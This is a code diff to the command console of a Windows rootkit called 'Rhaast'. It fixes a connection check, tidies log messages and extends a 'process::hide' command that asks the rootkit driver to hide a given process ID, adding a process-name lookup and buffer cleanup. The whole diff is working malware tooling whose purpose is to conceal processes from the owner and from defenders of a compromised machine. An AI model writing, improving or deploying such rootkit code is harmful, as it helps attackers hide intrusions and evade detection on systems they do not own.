@@ -58,17 +58,23 @@ VOID Rhaast::Routine(
     auto line  = std::string();
 
     /* check if we are connected */
-    if ( IsConnected() ) {
+    if ( ! IsConnected() ) {
         FmtErrorNotConnected();
     }
 
     /* input dispatch routine */
     do {
+        input.clear();
+
         /* display console */
+        std::cout << std::endl;
         std::cout << "[Rhaast] #> ";
 
         /* read input */
         getline( std::cin, line );
+
+        /* another space */
+        std::cout << std::endl;
 
         /* split string */
         StringTokenize( line, ' ', input );
@@ -85,11 +91,12 @@ VOID Rhaast::Routine(
 
         /* now finally dispatch input */
         if ( ! DispatchInput( input ) ) {
-            spdlog::error( "failed executing command" );
+            spdlog::error( "failed while executing command" );
         } else {
-            spdlog::info( "successfully executing command" );
+            spdlog::info( "successfully executed command" );
         }
 
+        /* do we wanna exit now? */
         if ( ExitNow ) {
             break;
         }
@@ -140,6 +147,8 @@ BOOL Rhaast::DispatchInput(
             FAIL_END
         }
 
+        spdlog::info( "connected to rhaast rootkit via \"{}\"", args[ 1 ] );
+
     } else if ( args[ 0 ] == "rhaast::disconnect" ) {
 
         /* close handle */
@@ -150,7 +159,8 @@ BOOL Rhaast::DispatchInput(
 
     } else if ( args[ 0 ] == "process::hide" ) {
 
-        ULONG Pid = 0;
+        ULONG  Pid  = 0;
+        BUFFER Name = { 0 };
 
         /* check if enough args has been specified */
         ARGS_CHECK_LEN( 1 )
@@ -164,12 +174,27 @@ BOOL Rhaast::DispatchInput(
         /* convert pid string to int */
         Pid = std::stoi( args[ 1 ].c_str() );
 
-        spdlog::info( "process hiding: {}", Pid );
-
         /* TODO: check if process exists */
+        if ( ProcessQueryNameById( Pid, &Name ) )
+        {
+            spdlog::info( "process to hide:" );
+            spdlog::info( "   - process id   : {}", Pid );
+            spdlog::info( "   - process name : {}", std::string( ( PCHAR ) Name.Buffer ) );
 
-        /* send command */
-        success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ) ) );
+            /* send command */
+            if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
+                spdlog::info( "process successfully hidden" );
+            } else {
+                spdlog::info( "failed while hiding process" );
+            }
+
+            /* free process name memory */
+            if ( Name.Buffer ) {
+                RtlSecureZeroMemory( Name.Buffer, Name.Length );
+                HeapFree( GetProcessHeap(), 0, Name.Buffer );
+                Name.Buffer = nullptr;
+            }
+        }
 
     } else if ( args[ 0 ] == "process::unhide" ) {
 
@@ -278,12 +303,6 @@ BOOL Rhaast::RhaastConnect(
  *
  * @param Size
  *      Size of buffer
- *
- * @param Return
- *      Response/Return from rootkit
- *
- * @param ReturnSize
- *      Size of response
  *
  * @return
  *      status while executing/sending command
